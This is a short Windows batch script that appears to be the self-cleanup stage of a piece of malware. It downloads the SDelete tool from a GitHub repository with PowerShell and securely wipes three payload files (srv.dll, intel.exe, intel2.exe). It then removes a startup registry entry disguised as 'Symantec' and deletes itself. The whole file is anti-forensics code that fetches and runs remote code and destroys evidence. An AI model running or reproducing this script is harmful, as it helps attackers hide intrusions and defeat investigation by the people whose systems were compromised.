cd %TEMP%
PING localhost -n 60 >NUL
powershell (New-Object System.Net.WebClient).DownloadFile('https://github.com/k0valska/asdqw1da/raw/master/sdelete.exe', 'sdelete.exe')
sdelete.exe /accepteula -p 51 srv.dll
sdelete.exe /accepteula -p 51 intel.exe
sdelete.exe /accepteula -p 51 intel2.exe
del sdelete.exe
call reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Symantec /f
del intel.bat
